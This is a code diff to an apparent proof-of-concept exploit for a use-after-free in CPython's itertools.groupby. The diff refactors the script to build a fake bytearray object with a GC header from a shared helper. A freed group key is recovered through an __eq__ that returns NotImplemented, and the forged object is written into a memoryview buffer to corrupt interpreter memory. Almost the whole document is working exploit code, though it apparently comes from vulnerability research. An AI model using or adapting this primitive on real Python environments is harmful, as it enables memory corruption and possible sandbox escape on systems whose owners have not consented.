@@ -78,6 +78,7 @@ groupby_next(PyObject *op)
 # original call, we can return NotImplemented to receive the deleted gbo->currkey value in Evil.__eq__ on the second run.
 
 from itertools import groupby
+from common import evil_bytearray_obj, PTR_SIZE, BYTEORDER
 
 class Lamb(bytearray):
     __slots__ = ()
@@ -89,16 +90,18 @@ class Lamb(bytearray):
         next(gbo)
         return NotImplemented
 
+# add GC header, subclasses *always* are part of the GC
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj(add_metadata=True)
+
 class Evil:
     __slots__ = ()
     called = False
     def __eq__(self, other):
-        if Evil.called:
-            # add GC header, subclasses *always* are part of the GC
-            backing = memoryview(bytearray(Lamb.__basicsize__ + tuple.__itemsize__ * 2)).cast('P')
-            backing[2] = 0xdeadbeef
-            backing[3] = id(bytearray)
-            backing[4] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
+        if Evil.called:           
+            backing = memoryview(bytearray(Lamb.__basicsize__ + PTR_SIZE * 2)).cast('P')
+            for idx in range(0, len(fake_obj), PTR_SIZE):
+                backing[idx // PTR_SIZE] = int.from_bytes(fake_obj[idx:idx + PTR_SIZE], BYTEORDER)
             raise Exception(backing, other)
         Evil.called = True
 
